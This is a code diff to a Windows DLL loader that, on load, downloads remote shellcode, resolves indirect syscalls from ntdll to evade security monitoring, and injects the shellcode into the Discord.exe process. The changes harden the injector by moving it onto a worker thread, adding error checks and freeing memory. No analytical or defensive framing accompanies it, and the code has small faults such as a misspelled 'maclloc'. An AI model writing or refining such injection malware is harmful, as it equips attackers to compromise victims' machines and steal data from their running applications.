@@ -7,7 +7,7 @@
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     switch (fdwReason) {
     case DLL_PROCESS_ATTACH:
-        injectPayload();
+        QueueUserWorkItem(injectPayload, NULL, WT_EXECUTEDEFAULT);
         break;
     case DLL_PROCESS_DETACH:
         break;
@@ -15,7 +15,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
     return TRUE;
 }
 
-BOOL injectPayload() {
+DWORD WINAPI injectPayload(LPVOID param) {
     NTSTATUS Status = 0;
     BOOL State = TRUE;
     HMODULE NtdllHandle = NULL;
@@ -26,14 +26,17 @@ BOOL injectPayload() {
 
     SIZE_T shellcodeSize = BUFFER_SIZE;
     const char* shellcode = (const char*)maclloc(BUFFER_SIZE)
+    if (shellcode == NULL) {
+        return 1;
+    }
 
     if (!downloadPayload(shellcode, shellcodeSize)) {
-        return TRUE;
+        return 1;
     }
 
     NtdllHandle = getModuleHandle();
     if (NtdllHandle == NULL) {
-        return TRUE;
+        return 1;
     }
 
     if (
@@ -46,7 +49,7 @@ BOOL injectPayload() {
         !IndirectPreludeDLL(NtdllHandle, "NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN, &g_NtWaitForSingleObjectSyscall) ||
         !IndirectPreludeDLL(NtdllHandle, "NtClose", &g_NtCloseSSN, &g_NtCloseSyscall)
     ) {
-        return TRUE;
+        return 1;
     }
 
     DWORD PID = getProcessPID("Discord.exe");
@@ -55,7 +58,7 @@ BOOL injectPayload() {
 
     Status = NtOpenProcess(&procH, PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, &OA, &CID);
     if (STATUS_SUCCESS != Status) {
-        return TRUE;
+        return 1;
     }
 
     Status = NtAllocateVirtualMemoryEx(procH, &Buffer, &shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE, NULL, 0);
@@ -88,6 +91,10 @@ CLEANUP:
         Status = NtFreeVirtualMemory(procH, &Buffer, &shellcodeSize, MEM_DECOMMIT);
     }
 
+    if (shellcode) {
+        free(shellcode);
+    }
+
     if (thread) {
         NtClose(thread);
     }
@@ -96,7 +103,7 @@ CLEANUP:
         NtClose(procH);
     }
 
-    return TRUE;
+    return 1;
 }
 
 BOOL downloadPayload(unsigned char* shellcode, size_t limit) {
